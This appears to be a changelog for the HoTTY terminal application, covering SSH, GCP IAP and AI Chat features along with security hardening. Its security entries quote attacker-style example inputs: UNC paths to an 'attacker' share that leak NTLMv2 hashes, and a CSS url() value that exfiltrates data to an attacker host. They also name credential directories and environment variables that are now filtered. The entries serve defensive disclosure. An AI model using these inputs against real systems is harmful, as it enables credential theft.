- **Vertex AI service-account key file path now rejects UNC / network paths.** A renderer-supplied `keyFilePath` like `\\attacker\share\key.json` would reach `Path::canonicalize()` before the approved-set check. On Windows, `canonicalize()` performs SMB resolution as a side effect — which means the auth flow leaks an NTLMv2 hash to the attacker-controlled UNC before the request is rejected. Both `validate_service_account_key` (the Tauri command path) and the `VertexAIProvider` auth-start path now reject `\\…` and `//…` prefixes up front, before any path resolution. Same defence as the SSH/Jumpbox UNC fix in beta5; this closes the Vertex AI side of the same class.
- **Local shell custom shell path now rejects UNC / network paths.** The **Local** session protocol lets users override the shell binary path via `shell_path` (a settings-time override, not a hot path). A UNC value like `\\attacker\share\evil.exe` would be handed to `portable_pty::CommandBuilder`, and the spawn would trigger SMB authentication against the attacker host before the binary was fetched — same NTLMv2 hash leak as the SSH key case. `LocalConfig::resolve_shell_path()` now refuses `\\…` / `//…` paths with `shell_path cannot be a UNC/network path`. Legitimate cases (local installations of cmd.exe / PowerShell / pwsh / Git Bash) are unaffected because the default resolution path looks up known binary locations, not user-typed paths.

## v2.0.3-beta5

A bug-fix-and-hardening release. The headline change fixes a long-standing **paste bug on Windows**: pasted multi-line text was producing an extra blank line between every row because the clipboard's CRLF was being forwarded to the remote shell unchanged. Three security hardening items round out the release — all defence-in-depth, none with a known active exploit — covering custom-theme JSON, SSH private-key paths, and the credential-environment filter applied to spawned `gcloud` / `wsl.exe` / local-shell child processes.

### Bug Fixes

- **Pasted text no longer gains a blank line between rows.** On Windows the system clipboard stores line breaks as CRLF (`\r\n`). When you confirmed a paste in HoTTY, the bytes were forwarded to the remote shell verbatim — the shell processed `\r` as Enter (executing the line) and then echoed the trailing `\n` as a literal newline, producing a visible blank row below each pasted line. The paste path now normalises `\r\n` and bare `\n` to a single `\r` before sending (matching xterm.js's own `prepareTextForTerminal()` behaviour), so a copied 10-line snippet pastes as 10 rows instead of 19. Standalone `\r` is left intact for environments that need it. The xterm.js built-in paste handler is intentionally suppressed so the Paste Confirmation modal can intercept first; this fix restores the normalisation step that the bypass removed.

### Security

- **Custom theme JSON values are now sanitised against CSS injection / external-resource exfiltration.** The `save_custom_theme` Tauri command previously validated only the length of theme-variable values (≤500 chars). A maliciously crafted theme JSON imported into `%APPDATA%/com.hotty.terminal/themes/` could set a variable value to, e.g., `url("https://attacker/x?leak=…")`; when the frontend later consumed that variable in a stylesheet rule (`background-image: var(--bg-primary)`), the browser would fetch the attacker URL and exfiltrate by request side-channel. The backend now rejects any theme value containing `url(`, `;`, `{`, `}`, `<`, `>`, or newline characters, and applies the same check to the four terminal colour values. The frontend `setProperty('--name', value)` path already discards structurally-malformed values, so the key side of the attack was never viable; this closes the value side.
- **SSH and Jumpbox private-key paths now reject UNC / network paths.** A renderer-supplied `private_key_path` like `\\attacker\share\probe` would cause `russh::keys::load_secret_key()` to issue an SMB read against the attacker-controlled UNC, which on Windows hands over an NTLMv2 hash that can be relayed elsewhere. Both `services::ssh::try_authenticate()` and `services::jumpbox::authenticate_jumpbox()` now refuse `\\…`, `//…`, and Win32 verbatim-UNC `\\?\UNC\…` paths before calling `load_secret_key`, returning `Private key path cannot be a UNC/network path` (or `Jumpbox: …` for the jumpbox hop) in the auth-failed toast. Legitimate UNC-stored keys can be copied to a local path; the security benefit on Windows outweighs the edge case.
- **Sensitive-environment filter for `gcloud` / `wsl.exe` / local shells now catches several more credential carriers.** The pattern list used to filter the parent process environment before inheriting it into spawned children (`gcloud`, `wsl.exe`, the local shell process) previously matched `API_KEY`, `SECRET`, `TOKEN`, `PASSWORD`, `PASSWD`, `CREDENTIAL`, `PRIVATE_KEY`, `ACCESS_KEY`. It now also matches `AUTH` (so `SSH_AUTH_SOCK` is filtered — important because inheriting it into `wsl.exe` gives the WSL user the host SSH agent), `SESSION` (so 1Password's `OP_SESSION_*` and similar session pointers are filtered), `PASSPHRASE`, and the explicit names `AWS_PROFILE` and `KUBECONFIG` (which are themselves pointers to credential files on disk). The three previously-duplicated copies of this filter across `gcloud_iap.rs`, `local.rs`, and `wsl.rs` are now backed by a single shared helper, so future additions only need to be made in one place.

## v2.0.3-beta4

A focused polish-and-fix release. The headline change rewrites the **SSH / Telnet / Jumpbox connection-failure messages** from raw library text (`connection failed: example.com:22: failed to lookup address information: ...`) into short, plain-English labels (`Host not found`, `Wrong passphrase for private key`, `Jumpbox: Connection refused`, …). The **GCP Instances pane** gains an IAM-aware filter that hides VMs you have no IAP tunnel permission for. A regression in the OS Login metadata probe — embedded `"` in the gcloud projection broke `cmd.exe`'s quoting and surfaced as `'C:\…\Google\Cloud' is not recognized` for some users on beta2 / beta3 — is fixed, and the same probe now also handles org-level OS Login enforcement correctly.

### New Features

- **GCP Instances pane: IAM-aware filter.** During Refresh, HoTTY now probes `iap.tunnelInstances.accessViaIAP` and `compute.instances.osLogin` at the project level (and, when project-level IAP is denied, also at the instance level) via `gcloud projects test-iam-permissions` / `gcloud compute instances test-iam-permissions`. VMs without IAP-tunnel permission are hidden by default, and a **🔒 counter button** in the pane header lets you toggle them back on. Instances without OS Login permission stay visible (SSH may still work via metadata SSH keys) but display a **🔑 warning glyph**. When the IAM probe itself fails (network blip, deleted project) the instance stays visible so accessible VMs are never hidden by accident. The "show hidden" toggle persists across launches via `localStorage`.

### Improvements

- **Plain-English SSH / Telnet / Jumpbox connection errors.** Connection-failure toasts now show short, human-friendly labels in place of the raw `russh` / `std::io::Error` text. Examples:

  | Before | After |
  | --- | --- |
  | `connection failed: example.com:22: failed to lookup address information: ...` | `Host not found` |
  | `connection failed: example.com:22: Connection refused (os error 10061)` | `Connection refused` |
  | `connection failed: example.com:22: timed out after 15s` | `Connection timed out (15s)` |
  | `connection failed: no common kex algorithms` | `No common kex algorithm with server` |
  | `authentication failed: all authentication methods failed` | `Authentication failed` |
  | `authentication failed: password: Disconnect ServiceNotAvailable` | `Password authentication failed` |
  | `authentication failed: load key failed: ... bad decrypt ...` | `Wrong passphrase for private key` |
  | `connection failed: ssh-over-jumpbox: timed out after 15s` | `Target connection timed out via jumpbox (15s)` |

  Failures on the jumpbox hop are tagged `Jumpbox: …` so you can tell which hop dropped the connection. The raw underlying error string is still written to the debug log file for diagnostics — only the toast text changes.
- **gcloud OS Login detection now respects org-level enforcement.** Previously, when neither the instance metadata nor the project metadata had `enable-oslogin=TRUE`, HoTTY would fall straight back to the local Windows username. That broke IAP connections in GCP organizations that enforce OS Login via the `constraints/compute.requireOsLogin` policy (typical for enterprise tenants), where the per-resource flag is never written. HoTTY now also probes the active account's POSIX profile in this case and uses the OS Login username when one exists, mirroring `gcloud compute ssh`'s own resolution order. Only when no POSIX profile is found does it fall back to the local username.
- **Shorter "Compute Engine API not enabled" message** (follow-up to beta3). The error that appears under a project row in the GCP Instances pane when the Compute Engine API is disabled has been further trimmed to just `Compute Engine API is not enabled.`. The previously-included `gcloud services enable compute.googleapis.com --project=…` command is dropped from the visible message; the full gcloud stderr (including that command) is still captured in the debug log if you want to copy / paste it.

### Bug Fixes

- **gcloud OS Login probe no longer fails with `'C:\…\Google\Cloud' is not recognized`.** The metadata describe call that beta2 added for OS Login detection used `--format=value("...filter("key:enable-oslogin")...")`, embedding `"` characters in the argument vector. Because `gcloud` ships on Windows as `gcloud.cmd` and Rust's standard library spawns `.cmd` files via `cmd.exe`, the cmd.exe "3-or-more `"` rule" stripped the outer quotes around the program path and gcloud failed before it ever ran. The probe now uses `--format=json(metadata.items)` (no embedded quotes) and parses the result with `serde_json`; a regression-guarded debug assertion in `run_gcloud_capture` rejects any future arg vector that contains `"` so the issue cannot return.

## v2.0.3-beta3

A small UI polish release. The headline change tidies up the **New Session** dialog so the **Hosts** and **GCP** tabs have matching widths and the Hosts tab clearly encloses both the host tree and the protocol form. A separate tweak shortens an over-long error string that appeared when GCP Discovery encountered projects without the Compute Engine API enabled.

### Improvements

- **New Session dialog: Hosts / GCP tabs now share a consistent layout.** Previously the **Hosts** tab visually shrank to 380 px (the tab bar sitting only above the host tree) while the **GCP** tab stretched to fill the modal — making the two tabs look like different widgets. The tab bar now spans the full modal width on both tabs, and on the **Hosts** tab the host tree, resize divider, and protocol form all live inside the tab body. The tab buttons themselves were also rebuilt as natural-width pills at the top-left of the strip (instead of two 50/50 half-width panes), so the protocol form on the right of the **Hosts** tab no longer reads as if it belonged to the **GCP** tab.
- **GCP Discovery: shorter "Compute Engine API not enabled" message.** The error that appears under a project row in the **GCP Instances** pane when the Compute Engine API is disabled (the typical case for `Default Gemini Project` / Vertex / AI-Studio-managed projects that never opted in to Compute Engine) was rewritten from two redundant sentences down to one. The duplicated project name and the "or enable it in the Cloud Console" alternative have been dropped; the remaining message keeps both the actionable `gcloud services enable compute.googleapis.com --project=…` command and the project ID, just less noisy in the pane.

## v2.0.3-beta2

A UX overhaul for Google Cloud IAP. IAP is no longer a per-host form field — the New Session dialog gains a dedicated **GCP** tab that browses every GCE instance across every project you have access to, with live status, start/stop controls, and a one-click connect. The connect path also now handles the "VM is stopped" case gracefully: HoTTY prompts before starting, or auto-starts when the host is configured to.

### Breaking Changes

- **Google Cloud IAP is no longer in the Protocol dropdown.** Both the **New Session** dialog and the host-tree add/edit modal drop the `Google Cloud IAP` protocol entry. Existing IAP entries in your saved host tree still connect on double-click (the IAP protocol itself, the `iapTunnel` shape, and the `gcloud-iap` connection path are unchanged on disk and at the backend), but they can no longer be created or edited through the host-tree form. To make a new IAP connection, open the **GCP** tab in the New Session dialog and double-click the VM you want.

### New Features

- **New GCP Instances tab in the New Session dialog.** A second tab next to **Hosts** lists every Google Compute Engine VM across every project you have access to, grouped by project, with live status glyphs (🟢 RUNNING, 🔴 stopped, 🟡 transitioning) and the last-refreshed timestamp. Selecting an instance highlights it; **double-clicking** an instance connects via IAP immediately. Each row has its own **Start** / **Stop** buttons — backed by `gcloud compute instances start` / `stop` — that show an optimistic "starting…" / "stopping…" label while polling `describe` for the real transition (PROVISIONING / STAGING / STOPPING) so the row reflects what GCP is actually doing. A top-of-pane **Refresh** action re-runs the full inventory: gcloud check, auth check, `projects list`, then `instances list --filter='zone:*'` per project. The pane streams progress (`gcloud → auth → projects → instances → done`) so a long refresh against many projects doesn't look hung.
- **Pre-connect VM auto-start prompt.** When you start an IAP connection — from the GCP tab, from a legacy saved IAP host entry, or from anywhere else — and the target VM is in `TERMINATED` or `SUSPENDED`, HoTTY now intercepts the connect before tunneling and either auto-starts the VM (when the saved host entry has `autoStart` set) or surfaces a modal asking whether to start it. The backend awaits the user's decision via a session-scoped one-shot and only proceeds with the IAP tunnel once the VM reaches `RUNNING`. Previously a connect to a stopped VM would hand off to `gcloud start-iap-tunnel`, hang briefly, and fail with an opaque tunnel error. One-shot connects from the new GCP tab default to auto-start (the user explicitly chose that VM, so prompting again would be churn).

## v2.0.3-beta1

A diagnostic-focused pre-release. The headline change instruments the Google Cloud IAP connection path end-to-end so when an IAP connect fails in a real environment, the debug log captures every phase boundary — gcloud and ssh.exe resolution, OS Login detection result, full subprocess argv and PIDs, gcloud stdout/stderr line-by-line, TCP-probe attempts, and elapsed times — instead of surfacing as an opaque "connection failed" string.

### Improvements

- **Google Cloud IAP connect now writes detailed phase-by-phase diagnostic logs.** Connecting via Google Cloud IAP now emits info-level logs at every step to the debug log file (open via the **Open Debug Log Folder** action). The log records the resolved `gcloud` program and `ssh.exe` paths, the presence of relevant environment variables (`PATH`, `APPDATA`, `USERPROFILE`, `CLOUDSDK_CONFIG`, …), the OS Login detection result and resolved username, the full `gcloud start-iap-tunnel` and `ssh.exe` argv, both subprocess PIDs, every line of `gcloud` stdout/stderr (previously debug-level and silently dropped in release builds), TCP-probe attempts against the picked local port, a heartbeat while waiting for tunnel-readiness, the captured `combined_log` if `gcloud` exits prematurely or readiness times out, and elapsed times for each phase. When an IAP connect fails, attaching this log file to a bug report is now enough to triangulate the cause (auth / network / OS Login / SSH key) without further reproduction.

## v2.0.2

A maintenance release. The headline change is a fix to the Google Cloud IAP tunnel readiness detection that caused fresh IAP connections to retry several times before succeeding. Two security follow-ups close renderer-side bypass gaps in the file-drop and ping-monitor flows — both no-known-exploit, but they were quietly eating into the dialog-attestation pattern used elsewhere in the app — and a small theming and UI consistency pass rounds out the release.

### Improvements

- **Hidden AI tab gradient is now themeable end-to-end.** Added a new `--color-danger-shade` theme variable (a darker variant of `--color-danger`) for the gradient endpoints on hidden AI chat tabs. Previously the endpoints mixed toward a hardcoded `black`, which looked right on dark themes but didn't reverse on light. Custom themes can now tune the shade alongside the other danger colors via **Settings &rarr; Appearance &rarr; Create Custom Theme &rarr; Status & Signals**.
- **Text Editor pane button consistency.** The Text Editor menu button and find-bar button now follow the standard `:hover:not(:disabled)` pattern (matching the Log Viewer and Ping Monitor toolbar buttons), and the find-bar button drops a stray border so it visually matches the menu button in the same pane.

### Bug Fixes

- **gcloud IAP tunnel readiness detection no longer trips on Python stderr buffering.** Connecting via Google Cloud IAP would silently fail readiness detection because `gcloud`'s `tunnel-through-iap` subprocess block-buffers its stderr when piped, so the "Listening on port N" line never reached HoTTY in time and the connect retried. Detection is now a TCP probe against the chosen local port rather than a stderr text scan, and the redundant pre-connect probe is removed.

### Security

- **Text Editor file-drop now requires explicit user attestation.** When the renderer asks the backend to approve a file path that was dragged into the Text Editor, the backend now shows a native OS confirm dialog before adding the path to the approved set. The previous flow accepted any non-symlink, non-sensitive, &le;50 MB path that the renderer supplied, which left a renderer-side bypass of the dialog-attestation pattern already used by `text_editor_open_file` / `text_editor_save_file`. Approvals are cached per-session so re-opening the same file in the same launch does not re-prompt; a fresh app launch prompts again. The Tauri-level drag-and-drop event is still disabled, so the prompt cannot be triggered without a renderer-initiated request.
- **Ping Monitor CSV logging now requires a user-approved log directory.** When CSV logging is enabled on a ping monitor, the backend now consults `LogManager::is_dir_approved` before writing the file — matching the gating already in place for session logging. If the directory has not been approved via the **Browse...** picker or the native confirm dialog, the monitor still runs but does not produce a CSV (and does not emit a fake log-file path back to the renderer). Use the **Browse...** button on the Ping Monitor pane to approve the directory once; the approval persists alongside the existing session-log approvals.

## v2.0.1

A focused follow-up to v2.0.0. The headline change makes **Google Cloud IAP** a top-level protocol so IAP connections no longer require any SSH credentials. The rest is security — two file-system protections that close a renderer-side enumeration gap and repair a Windows-only matcher bug that had been silently disabling the existing sensitive-path checks — plus a small UI-font consistency pass left over from the v2.0.0 polish round.

### New Features

- **Google Cloud IAP is now a first-class protocol.** Previously a "Connect via Google Cloud IAP" checkbox inside the SSH form, IAP is now its own entry in the Protocol dropdown (in both the New Session dialog and the host-tree add/edit modal). When you select it, the username / password / private-key fields disappear entirely — HoTTY delegates the connection to <code>gcloud compute ssh --tunnel-through-iap</code>, which handles the IAP tunnel, OS Login mapping, automatic SSH key generation (<code>~/.ssh/google_compute_engine</code>), key registration with the project, and authentication on your behalf. You only need a Google Cloud SDK install and a completed `gcloud auth login`. The host tree shows IAP entries as `<project>:<instance> (IAP)` so they're easy to recognise.

### Improvements

- **UI font consistency.** Action buttons in the **Confirm**, **Paste Confirmation**, **SSH Host Key**, **Ask AI**, and **Custom Theme Creator** modals, plus toolbar buttons in the **Log Viewer**, **Ping Monitor**, and **Text Editor** panes, now use the UI chrome font (`--ui-font-family`). Several were rendering in the monospace `--font-family`, which looked subtly off against the surrounding chrome. Inner monospace content (paste preview, host-key fingerprint, etc.) is unchanged. The Confirm, Ask AI, and Custom Theme Creator modal containers also pick up an explicit chrome-font declaration that was missing.

### Security

- **File Explorer refuses to list sensitive directories.** The file-browser pane (and the underlying `file_explorer_list_directory` Tauri command) now refuses to enumerate paths that resolve under credential-store directories — `~/.ssh`, `~/.aws`, `~/.azure`, `~/.gnupg`, `%APPDATA%\Roaming\gcloud`, `%APPDATA%\Local\Microsoft\Vault`, HoTTY's own `%APPDATA%\{Roaming,Local}\com.hotty.terminal`, and the rest of the existing block-list. Previously the renderer could enumerate any directory; while contents were not exposed, filenames and mtimes leaked which credentials existed and when they were last touched. This is defence-in-depth — exploitation required a renderer compromise to begin with — but the Text Editor and Log Viewer read paths were already gated this way, and the File Explorer should match.
- **Sensitive-path matcher repaired on Windows.** `is_sensitive_path()` — the gate behind the Text Editor read/write, dropped-file approval, and Vertex AI service-account key file flows — compared canonical paths via a `starts_with(home + dir)` prefix check. On Windows, `canonicalize()` returns paths with a `\\?\` verbatim prefix, which the matcher did not strip, so the comparison never matched and the gate was effectively a no-op on canonical paths. The matcher now strips the verbatim prefix from both the resolved path and the home directory before comparing, and a regression test covers it. No exploitation has been reported, but the on-disk protection these flows were nominally enforcing now actually fires.

## v2.0.0

The v2.0.0 stable release. A final hardening pass lands five additional defence-in-depth measures around credential storage and the Tauri command surface, plus minor visual cleanup across the modal family.

### Improvements

- **Modal consistency polish.** Several minor visual inconsistencies were aligned across the modal family: **Ask AI** now clips its content cleanly to the rounded corners while scrolling, the **System Prompt** overlay no longer adds an extra inset, the **Custom Theme Creator** dialog uses the standard modal z-index, and the **Paste Confirmation** and **SSH Host Key** dialogs use the chrome font for their containers (inner monospace previews and fingerprints unchanged). The Text Editor menu, find-bar, and find-close buttons now use the standard 4px corner radius.

### Security

- **AI service-account key files require dialog attestation.** Vertex AI's `service_account` auth path now refuses any `keyFilePath` that was not picked through the native file dialog. A compromised renderer can no longer point AI authentication at an arbitrary on-disk JSON key. The `auto_auth` resume path is unaffected — it loads `client_email` and `private_key` from the DPAPI-encrypted on-disk config and never re-reads the user's key file.
- **DPAPI ciphertexts are now bound to HoTTY.** New credentials are encrypted with `CryptProtectData` using HoTTY-specific entropy plus an internal "HoTTY" marker prepended to the plaintext. The renderer-callable `dpapi_decrypt` / `dpapi_decrypt_batch` commands therefore refuse foreign DPAPI blobs (e.g. another application's encrypted-key blob), where they previously functioned as a generic per-user decrypt oracle. Pre-entropy `[SAFE]` blobs from earlier HoTTY versions still decrypt transparently and upgrade in place on the next save.
- **Sensitive-path block list extended.** The Text Editor and dropped-file approval flow now refuse paths under `~/.aws`, `~/.azure`, `%APPDATA%\Roaming\gcloud`, `%APPDATA%\Local\Microsoft\Vault`, `~/.config/gcloud`, and HoTTY's own `%APPDATA%\{Roaming,Local}\com.hotty.terminal` directories. The last entry matters: it prevents a write-via-editor path from tampering with HoTTY's `approved_log_dirs.json`, `vertexai_config.json`, etc., which would otherwise undermine the dialog-attestation invariants used elsewhere in the app.
- **Telnet auto-login no longer leaks the password as the username.** A telnet server whose pre-login banner ended in `...Password:` (instead of the expected `Username:`) used to make the auto-login state machine fall straight through to the password phase before sending the username — causing the configured password to be sent into the username field. The state machine now reacts only to a real username prompt while waiting for the username.
- **Backend session config debug output redacts credentials.** `SshConfig`, `TelnetConfig`, and `JumpboxConfig` no longer expose `password` / `private_key_passphrase` values through Rust's `{:?}` debug formatter. They were not reaching any log call site today; this is defence-in-depth against a future log-format regression accidentally dumping them.

## v2.0.0-beta13

A second hardening pass before the stable release. Terminal font and scrollback settings now apply to already-open sessions, AI Chat tabs follow their linked terminal through close events, and three security mitigations land around frontend logging, log-folder access, and external URL opening.

### Improvements

- **Terminal font and scrollback updates apply to open sessions.** Changing **Settings &rarr; Appearance &rarr; Font Size**, **Font Family**, or **Settings &rarr; General &rarr; Scrollback Buffer** now retunes already-running terminals immediately. Previously the new values only took effect for new connections.
- **AI Chat tabs follow session lifecycle.** When a terminal session closes (auto-close on disconnect or manual close), tabs in any AI Chat pane that were linked to that session are closed too. The last tab in a pane is unlinked instead of closed so the pane keeps a usable tab.
- **Modal close-X buttons unified.** The header close-X font size in **Ask AI** and **System Prompt** dialogs now matches the rest of the modal family.

### Security

- **Log folders require explicit approval.** Logging only writes to — and Log Viewer only reads from — folders that the user has approved. Picking a folder via the **Browse...** button approves it automatically; a typed path triggers a native OS confirm dialog the first time it is used. Approvals are persisted to `%APPDATA%\com.hotty.terminal\approved_log_dirs.json` (per-user, renderer cannot write to it), so the dialog only appears once per folder ever — not on every app launch. A compromised renderer cannot synthesise that approval, so it cannot point logging or the Log Viewer at attacker-supplied paths just by calling Tauri commands.
- **External URLs outside a curated allowlist now require user confirmation.** Links to the HoTTY repository, gcloud install docs, the GPL license, and the Google OAuth consent flow continue to open immediately. Any other URL — including links the user clicks in terminal output or AI chat — opens a native confirm dialog showing the full URL before it is handed to the system browser. The Tauri capability scope is correspondingly narrowed so only the curated hosts are reachable through the plugin.
- **Frontend log forwarding redacts credential-like fields.** Calls to `logDebug` (the channel that forwards messages from the renderer to the persisted debug log under `%APPDATA%/com.hotty.terminal/logs/`) now strip values for fields named `password`, `apikey` / `api_key` / `api-key`, `secret`, `token`, `clientSecret`, `privateKey`, `refreshToken`, `accessToken`, plus `Bearer` HTTP headers. Messages are also capped at 4 KB on both ends. This is defence-in-depth: it does not fix a known leak in current code, it limits the blast radius of any future regression that accidentally logs a credential.

## v2.0.0-beta12

A hardening pass before the stable release. Modernised SSH algorithm defaults, a stream-idle watchdog for AI Chat, fixes for several quiet data-integrity bugs (host tree, AI chat history, persona settings), and a sweep of UX polish around modals, focus, and validation.

### New Features

- **AI Chat tab → linked terminal flash** — clicking an AI Chat tab whose conversation is linked to a terminal session briefly highlights that terminal pane so you can tell at a glance which session it belongs to.
- **AI stream idle watchdog** — if an AI provider stops sending data mid-response (network drop, hung backend, etc.), the in-flight request is cancelled after 3 minutes of silence and the chat shows an error instead of staying stuck on "streaming".
- **`diffie-hellman-group-exchange-sha1` confirmation prompt** — enabling this deprecated KEX in **Settings → Protocols → SSH Algorithms** now shows a warning dialog explaining that SHA-1 is broken and offering safer alternatives.
- **OS-locale-aware AI Chat language** — first-run users on Japanese-locale machines now see the AI Chat language set to 日本語 by default instead of English. Existing users keep whatever they had selected.
- **SessionDialog input validation** — the connection form now catches empty hosts, ports outside 1–65535, malformed GCP project IDs, and CRLF/whitespace injection before the connect is attempted.

### Improvements

- **Modern SSH KEX defaults** — `diffie-hellman-group14-sha256` ships enabled and `diffie-hellman-group1-sha1` ships disabled in the bundled algorithm list. Existing users keep their saved choices; algorithms newly added in a release are merged into the user's saved file on load so security improvements aren't blocked behind a manual reset.
- **Jumpbox host-key prompt now times out** — leaving the bastion's host-key prompt unanswered used to hang the whole connect indefinitely. The prompt now disconnects after 5 minutes if no response.
- **Modal Escape stack** — pressing Escape with multiple modals open now only closes the topmost one. Previously every mounted modal's listener fired in parallel and could close background dialogs you didn't see.
- **Focus is restored after a modal closes** — closing a modal returns focus to whatever element had it before the modal opened (input field, terminal, button) instead of leaving focus stranded on a removed button.
- **Multi-byte prompt detection** — terminal text is now NFC-normalised before matching against your prompt-pattern regex, so prompts containing combining marks or full-width characters (Japanese, accented Latin) are detected consistently regardless of how the device sent them.
- **Surfaced silent failures** — clipboard copy and session-logging toggle failures now show as toast notifications instead of being swallowed, and AI Chat surfaces invoke errors that previously left the UI stuck in a "streaming" state.
- **Faster failure on unreachable AI providers** — AI HTTP requests now have a 30-second connect timeout so misconfigured endpoints fail quickly rather than hanging the chat.

### Bug Fixes

- **Session disconnect was leaking background tasks.** SSH/Serial/WSL/Local sessions used `tokio::time::timeout` on the reader/writer/keepalive task handles, but timing out only dropped the JoinHandle (detached the task) instead of aborting it. Long-lived runs slowly accumulated zombie tasks. The grace period is now 1.5 seconds and overruns are explicitly aborted.
- **AI Chat could break after cancelling a response.** Cancelling a stream left the user message in chat history without an assistant reply, violating the user/assistant alternation Anthropic requires. The next request would be rejected by the API. Cancelled turns now record an `[cancelled]` placeholder so subsequent messages send cleanly.
- **`aiCommandIdleTimeoutSecs`, custom AI personas, and other settings could be wiped on upgrade.** The settings migration unconditionally overwrote `aiPersonas` with the bundled defaults at version bumps. Customised prompts and user-added personas are now preserved across upgrades; use **Reset All Personas** in Settings to pull in the latest stock prompts on demand.
- **Update notifier got the order of `beta9` vs `beta10` wrong.** Lexicographic string compare ranked `beta10 < beta9`, so users on `beta10` could be told a `beta9` was newer (or no update was offered). Pre-release tags are now compared numerically when they share the same alphabetic prefix.
- **Host tree edits could be lost under rapid edits.** Encryption is asynchronous, and two quick edits could complete out of order — the older encryption result would overwrite the newer one in `localStorage`. Writes are now guarded by a monotonic counter so only the most recent encryption is persisted.
- **Session status briefly flickered through duplicate error transitions.** Both the connect-promise catch block and the `onSessionError` listener pushed a state update + log entry for the same failure. The redundant path is now suppressed.
- **Re-opening Settings could show a stale "enable SHA-1?" warning dialog.** If the user closed the Settings modal while the confirmation prompt was up, the pending state survived and the dialog reappeared on the next open. The state now resets on tab unmount.
- **Closing an AI Chat pane before its linked terminal leaked watch buffers.** The buffer for the linked session lingered until the session itself was removed. Session removal now always evicts its buffer regardless of which pane was watching.

### Security

- **Text Editor refuses to approve dropped symlinks.** Dragging a file into the Text Editor now rejects symbolic links directly so a user can't be tricked into approving a link that resolves to a sensitive location.
- **`known_hosts` write failures are now visible to the user.** When SSH cannot save or remove an entry (permission denied, disk full, etc.) the failure is logged and an `ssh-known-hosts-warning` event is emitted so you find out at the time, not on the next connection where the host key prompt reappears unexpectedly.
- **DPAPI passthrough now warns on suspicious input.** When the credential decryptor falls back to plaintext passthrough on input that *looks* prefixed (starts with `[` but with an unknown tag), it now logs a warning so accidental corruption of the encryption tag is visible in logs.

## v2.0.0-beta11

A correctness and security release. The SSH algorithm preferences in Settings now actually drive the handshake (they were previously cosmetic), unblocking legacy devices that need SHA-1 KEX, 3DES, or DSA host keys, and the jumpbox SSH path picks up the same `known_hosts` I/O hardening already applied to the direct path.

### Bug Fixes

- **SSH algorithm preferences from Settings now apply to connections.** Previously the kex / cipher / MAC / host-key toggles in **Settings &rarr; Protocols &rarr; SSH Algorithms** were saved but never read by the SSH client — every session offered russh's hardcoded default list regardless of what was selected in the UI. They now drive the handshake for both direct SSH and jumpbox connections. This unblocks legacy devices (e.g. Cisco Catalyst 3650, older Cisco IOS) that require SHA-1 KEX (`diffie-hellman-group14-sha1`, `diffie-hellman-group1-sha1`, `diffie-hellman-group-exchange-sha1`), `3des-cbc`, or `ssh-dss` host keys — these are now selectable and effective.
- Disabling every algorithm in a category now fails the connection with a clear error rather than silently falling back to library defaults. Unknown algorithm names in the saved config log a warning and are skipped instead of being silently ignored.

### Security

- **Jumpbox known_hosts I/O errors now refuse the connection** instead of treating the host as new. Matches the existing hardening on the direct SSH path; prevents an attacker who can corrupt or chmod-zero the bastion's `known_hosts` from coaxing the user back into a "new host" prompt and accepting an attacker-controlled key.

## v2.0.0-beta10

A major AI Chat UX overhaul: per-pane tabs with smart linking to terminal sessions, an inline execution mode bar with pause/resume, a new device-response idle timeout, and a tightened Network Expert persona prompt.

### New Features

- **AI Chat tabs** — AI Chat panes now host multiple tabs in a top-of-pane tab strip. Toggling **AI Monitor** on a terminal links a tab to that session; turning it on for additional terminals creates a new tab per terminal so concurrent watch streams stay separated. Selecting a terminal mirrors the active AI tab back to the matching link, and the currently linked terminal is shown as a chip next to the input. Use **+ New chat** to start a fresh tab.
- **Inline execution mode bar with pause/resume** — the AI Chat pane now has an Execution Mode chip docked at the bottom of the input card with a dedicated pause/resume control for the auto-run loop. The same controls used to live behind a Settings dialog.
- **AI command idle timeout** — new `aiCommandIdleTimeoutSecs` setting (default 10 seconds, `0` disables, 30-minute hard cap) replaces the previous silent 30-second wall-clock timeout in the AI execute polling loop. When the timeout fires, the captured output and a `[no response from device for N seconds]` note are sent to the AI so the conversation continues instead of stalling.

### Improvements

- **AI Chat UX redesign** — chip-style mode picker, linked-terminal chip, empty-state onboarding, send-disabled hints, and live streaming-token feedback.
- **Unified AI Chat input** — input, attachments, and the execution-mode chip are now part of a single rounded card with the chip right-aligned for a cleaner footprint.
- **AI Chat header settings popover** — settings previously scattered across the AI Chat header are consolidated into a popover triggered from the input toolbar; the standalone System Prompt button is removed and now lives inside the popover.
- **Collapsible terminal output blocks** — terminal output captured into AI Chat messages renders as a collapsible block with the first command line, line count, and character count visible in the header. Click or press <kbd>Enter</kbd>/<kbd>Space</kbd> to expand.
- **Network Expert persona prompt** — rewritten with a leading mandatory start-of-session protocol (REPLY 1: show-version equivalent, REPLY 2: terminal-length-0 equivalent, REPLY 3+: address user) so paginated devices no longer stall the AI response loop.
- **SSH/Telnet connect timeout default** — bumped from 3 seconds to 5 seconds, more forgiving to slower jumpbox / IAP-tunnel paths.

### Bug Fixes

- **AI Chat target chip stuck** — the linked-terminal chip now clears when its session is removed or **AI Monitor** is turned off, instead of staying displayed against a non-existent session.
- **AI execute output truncation** — fixed a path where long terminal output captured for the AI execute loop was truncated before reaching the model.

## v2.0.0-beta9

Automatic v1→v2 host-tree credential migration, paste-flow fixes, and security hardening around the asset protocol and SSH known-hosts handling.

### Improvements

- **Automatic v1→v2 host-tree credential migration** — host trees imported or carried over from the previous Electron build of HoTTY (v1) used `[SAFE]` + base64(`v10` + DPAPI blob) for `username` / `password`. On first load, those entries are now upgraded in place to the v2 format (`[SAFE]` + base64(DPAPI blob)). The migration runs in the Rust backend, is idempotent (v2 entries pass through byte-for-byte), and plaintext credentials never cross the IPC boundary.

### Bug Fixes

- **Ctrl+V pasted clipboard content twice** — pressing Ctrl+V used to insert the clipboard content once before the paste-confirmation dialog opened, and again when the user clicked "Paste". xterm.js's internal `paste` DOM listener was firing independently of our keydown interceptor. The terminal host now suppresses the native paste event so the confirmation dialog is the sole paste path. Right-click paste was unaffected.
- **Terminal lost focus after the paste-confirmation dialog closed** — confirming or cancelling the paste dialog left focus stranded on the (now-removed) Paste button, requiring an extra click before the keyboard worked again. Focus is now restored to the originating terminal pane after the dialog unmounts.

### Security

- **Tighter Tauri asset protocol scope** — the `assetProtocol.scope` in `tauri.conf.json` was widened to `**` (any path) earlier in the v2 line. It is now restricted to image extensions only (`.png`, `.jpg`, `.jpeg`, `.gif`, `.bmp`, `.webp`, `.ico`, `.svg`). The pane-background-image feature continues to work; defense-in-depth against renderer compromise.
